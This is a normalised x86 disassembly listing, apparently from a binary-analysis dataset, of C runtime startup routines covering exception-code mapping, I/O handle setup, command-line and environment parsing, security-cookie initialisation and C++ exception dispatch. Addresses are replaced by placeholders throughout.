cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp [ ecx ] 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
or eax 0xffffffff
pop ebx
jmp r-xdata
cmp [ ecx ] 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp [ ecx ] 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_100429fb
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_100428a0
pop ecx
pop ecx
pop ebp
retn
sub_10042a36
push 0x64
push r--data
call sub_1003f180
push 0xb
call sub_10045009
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x40
push 0x20
pop edi
push edi
call sub_1003f09c
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_10045850
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x42 ] 0x0
je r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov al [ ecx + 0x24 ]
and al 0x7f
mov [ ecx + 0x24 ] al
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
jmp r-xdata
call sub_1003f1c5
retn
push 0xfffffffe
pop ebx
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10042ce1
xor eax eax
mov esi edi
shl esi 0x6
add esi [ rw-data ]
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0xffffffff
je r-xdata
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
add eax 0x4
mov [ ebp - 0x28 ] eax
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax 0x800
cmp ecx eax
jl r-xdata
mov [ esi + 0x4 ] 0x81
test edi edi
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor esi esi
inc esi
mov [ ebp - 0x30 ] esi
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ edi - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x80
mov [ esi + 0x4 ] al
jmp r-xdata
mov edi ebx
mov [ ebp - 0x2c ] edi
push 0xfffffffe
pop ebx
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
push 0x40
push edi
call sub_1003f09c
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
mov [ esi + 0x4 ] al
mov [ esi ] ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
je r-xdata
inc edi
jmp r-xdata
xor edi edi
mov esi [ edx ]
cmp esi 0xffffffff
je r-xdata
mov [ esi * 4 + rw-data ] ecx
add [ rw-data ] edi
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ eax + edi * 4 ]
mov [ eax + 0x10 ] ebx
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x2c ] edi
cmp edi 0x3
jge r-xdata
inc edi
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
add edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp esi ebx
je r-xdata
inc esi
mov [ ebp - 0x30 ] esi
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov [ esi ] ecx
and eax 0xff
cmp eax 0x2
jne r-xdata
cmp edi ecx
jge r-xdata
mov al [ eax ]
test al 0x1
je r-xdata
cmp [ rw-data ] ecx
jge r-xdata
mov eax [ esi * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
cmp eax 0x3
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
jmp r-xdata
test al 0x8
jne r-xdata
push 0x0
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_100431f9
add esp 0xc
inc [ esi + 0x8 ]
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x8
mov [ esi + 0x4 ] al
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] esi
mov eax [ edx ]
mov [ esi ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0x0
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_100431f9
add esp 0xc
inc [ esi + 0x8 ]
mov edx [ ebp - 0x20 ]
push esi
call [ GetFileType@IAT ]
mov edx [ ebp - 0x20 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub_10042cea
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
cmp edi eax
jae r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call sub_1003f3e3
and [ esi ] 0x0
pop ecx
add edi 0xc
mov ecx [ esi ]
add edi 0x40
add ecx 0x800
lea eax [ edi - 0xc ]
cmp eax ecx
jb r-xdata
push edi
call [ DeleteCriticalSection@IAT ]
cmp [ edi - 0x4 ] 0x0
je r-xdata
sub_10042d3c
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push esi
push edi
push 0x104
mov edi rw-data
xor ebx ebx
push edi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov esi [ rw-data ]
mov [ rw-data ] edi
test esi esi
je r-xdata
call sub_10041b9c
mov esi edi
cmp [ esi ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x8 ]
cmp ecx 0xffffffff
jae r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push esi
call sub_10042def
mov ebx [ ebp - 0x4 ]
add esp 0x14
cmp ebx 0x3fffffff
jae r-xdata
lea edx [ ecx + ebx * 4 ]
cmp edx ecx
jb r-xdata
push edx
call sub_1003f0e4
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + ebx * 4 ]
push eax
push edi
push esi
call sub_10042def
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] edi
mov [ rw-data ] eax
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10042def
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
and [ ebx ] 0x0
mov edi [ ebp + 0x10 ]
mov [ eax ] 0x1
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
xor ecx ecx
mov [ ebp + 0x8 ] ecx
mov [ eax ] edi
add eax 0x4
mov [ ebp + 0xc ] eax
inc [ ebx ]
test edi edi
je r-xdata
xor eax eax
test ecx ecx
sete al
inc esi
mov ecx eax
mov al 0x22
mov [ ebp + 0x8 ] ecx
jmp r-xdata
mov al [ esi ]
inc esi
mov [ ebp + 0x1b ] al
movzx eax al
push eax
call sub_10047970
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
test ecx ecx
jne r-xdata
mov al [ ebp + 0x1b ]
test al al
je r-xdata
inc [ ebx ]
test edi edi
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x20
je r-xdata
dec esi
mov ecx [ ebp + 0x8 ]
inc esi
mov al [ esi ]
mov [ edi ] al
inc edi
test edi edi
je r-xdata
cmp al 0x9
jne r-xdata
mov edx [ ebp + 0xc ]
pop edi
pop esi
pop ebx
test edx edx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
and [ ebp + 0x18 ] 0x0
mov [ edi - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
pop ebp
retn
and [ edx ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov [ edx ] edi
add edx 0x4
mov [ ebp + 0xc ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test cl 0x1
jne r-xdata
dec ecx
test edi edi
je r-xdata
mov al [ esi ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
inc [ ebx ]
mov [ edi ] 0x5c
inc edi
test edi edi
je r-xdata
cmp [ ebp + 0x18 ] ecx
jne r-xdata
xor eax eax
xor edx edx
cmp [ ebp + 0x18 ] eax
sete al
mov [ ebp + 0x18 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ ebx ]
jmp r-xdata
mov [ edi ] 0x0
inc edi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
call sub_10047970
pop ecx
test edi edi
je r-xdata
cmp al 0x9
je r-xdata
xor edx edx
inc edx
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ ebx ]
inc esi
inc [ ebx ]
mov al [ esi ]
mov [ edi ] al
inc edi
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
inc [ ebx ]
sub_10042f6b
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_10041b9c
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ edi + 0x1 ]
push 0x4
push eax
call sub_1003f09c
mov edi eax
mov [ rw-data ] edi
pop ecx
pop ecx
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_1003e2d0
inc esi
pop ecx
add esi eax
inc edi
mov esi [ rw-data ]
push ebx
cmp [ esi ] 0x0
je r-xdata
push esi
call sub_1003f3e3
and [ rw-data ] 0x0
and [ edi ] 0x0
xor eax eax
mov [ rw-data ] 0x1
push esi
call sub_1003e2d0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
add esi ebx
cmp [ esi ] 0x0
jne r-xdata
push 0x1
push ebx
call sub_1003f09c
mov [ edi ] eax
pop ecx
pop ecx
test eax eax
je r-xdata
mov esi [ rw-data ]
push [ rw-data ]
call sub_1003f3e3
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1003d191
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003fe38
int3
add edi 0x4
sub_1004304c
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
mov eax [ rw-data ]
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x14 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_100430ee
push ebp
mov ebp esp
push ecx
push edi
call [ GetEnvironmentStringsW@IAT ]
mov edi eax
xor eax eax
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push esi
mov esi edi
cmp [ edi ] ax
je r-xdata
push ebx
push eax
push eax
push eax
sub esi edi
push eax
sar esi 0x1
inc esi
push esi
push edi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add esi 0x2
cmp [ esi ] ax
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_1003f0e4
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
add esi 0x2
cmp [ esi ] ax
jne r-xdata
xor eax eax
push eax
push eax
push [ ebp - 0x4 ]
push ebx
push esi
push edi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebx
call sub_1003f3e3
pop ecx
xor ebx ebx
pop ebx
pop esi
sub_100431d7
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsSetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_100431f9
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
xor eax eax
inc eax
pop ebp
retn
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10043227
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jns r-xdata
xor eax eax
test esi esi
pop esi
setg al
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
xor esi esi
xor eax [ rw-data ]
mov [ ebp - 0x4 ] esi
je r-xdata
mov [ rw-data ] esi
push esi
lea ecx [ ebp - 0x4 ]
push ecx
call eax
cmp eax 0x7a
jne r-xdata
inc esi
sub_10043267
push esi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
retn
sub_1004352b
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_1004354b
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_10043570
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_10047a9c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_10047a9c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1004364c
push 0x8
push r--data
call sub_1003f180
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_1003f1c5
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_1003e524
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
sub_100436fd
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003e905
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
pop ecx
sub_10043722
push 0x30
push r--data
call sub_1003f180
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov edi [ ebp + 0xc ]
mov eax [ edi - 0x4 ]
mov [ ebp - 0x28 ] eax
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
lea eax [ ebp - 0x40 ]
push eax
call sub_1003e707
pop ecx
pop ecx
mov [ ebp - 0x2c ] eax
call sub_100424a8
mov eax [ eax + 0x88 ]
mov [ ebp - 0x30 ] eax
call sub_100424a8
mov eax [ eax + 0x8c ]
mov [ ebp - 0x34 ] eax
call sub_100424a8
mov [ eax + 0x88 ] esi
call sub_100424a8
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
mov [ ebp - 0x4 ] ebx
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_1003e4c4
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_10043869
mov eax edi
call sub_1003f1c5
retn
sub_100437c1
mov esp [ ebp - 0x18 ]
call sub_100424a8
xor ebx ebx
mov [ eax + 0x3ac ] ebx
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov eax [ edi + 0x8 ]
movsx eax [ edi + 0x8 ]
jmp r-xdata
push eax
push edx
push ebx
push edi
call sub_100441f4
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_10043869
mov eax edi
call sub_1003f1c5
retn
imul edi ecx 0x14
mov [ ebp + 0x18 ] edi
cmp eax [ edi + esi + 0x4 ]
mov edi [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] eax
mov esi [ edx + 0x10 ]
mov ecx ebx
mov [ ebp - 0x24 ] ecx
cmp [ edx + 0xc ] ecx
jbe r-xdata
inc ecx
mov [ ebp - 0x24 ] ecx
cmp ecx [ edx + 0xc ]
jb r-xdata
mov edi [ ebp + 0x18 ]
cmp eax [ edi + esi + 0x8 ]
mov edi [ ebp + 0xc ]
jg r-xdata
imul eax ecx 0x14
mov eax [ eax + esi + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov eax [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
sub_10043869
mov eax [ ebp - 0x28 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x2c ]
call sub_1003e731
pop ecx
call sub_100424a8
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x88 ] ecx
call sub_100424a8
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov edi [ ebp - 0x1c ]
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
retn
test edi edi
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_1003e781
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_1004364c
pop ecx
pop ecx
jmp r-xdata
sub_10043928
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_10043f56
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_1003e680
call sub_1003e6b2
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_100441f4
mov eax [ esi + 0x4 ]
inc eax
push 0x100
push [ ebp + 0x28 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_10043722
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_100439a3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_100424a8
xor ecx ecx
inc ecx
mov [ eax + 0x3ac ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_100439f0
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
xor ebx ebx
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x1 ] bl
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov eax [ eax + 0x8 ]
movsx eax [ eax + 0x8 ]
jmp r-xdata
call sub_100435bc
cmp eax [ edi + 0x4 ]
jl r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_100424a8
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ ebp + 0x1c ] bl
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_100435bc
call sub_100435f4
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push esi
call sub_10043d8d
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_100424a8
cmp [ eax + 0x88 ] ebx
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_100424a8
mov esi [ eax + 0x88 ]
call sub_100424a8
push 0x1
push esi
mov [ ebp - 0x24 ] 0x1
mov eax [ eax + 0x8c ]
mov [ ebp + 0x8 ] eax
call sub_10047ac7
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_100435bc
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_1003e602
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x28 ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_100424a8
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_1004364c
pop ecx
pop ecx
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
call sub_100424a8
mov eax [ eax + 0x94 ]
mov [ ebp - 0x14 ] eax
call sub_100424a8
push [ ebp - 0x14 ]
push esi
mov [ eax + 0x94 ] ebx
call sub_10043ea9
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
